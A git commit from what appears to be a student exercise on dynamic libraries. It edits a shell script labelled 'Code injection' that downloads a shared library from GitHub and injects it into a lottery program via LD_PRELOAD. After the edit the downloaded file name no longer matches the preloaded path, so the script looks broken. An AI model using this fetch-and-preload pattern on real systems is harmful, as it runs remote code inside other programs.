159cf21f5c2c0eaad2ceb590de1578eb4138d789
uwen-godwin <uwengodwin001@gmail.com>
2023-12-20 10:51:17 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /temp https://github.com/uwen-godwin/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmake.so
+wget -P /temp https://github.com/uwen-godwin/alx-low_level_programming/raw/master/0x18-dynamic_libraries/gwin.so
 export LD_PRELOAD=/temp/libmake.so
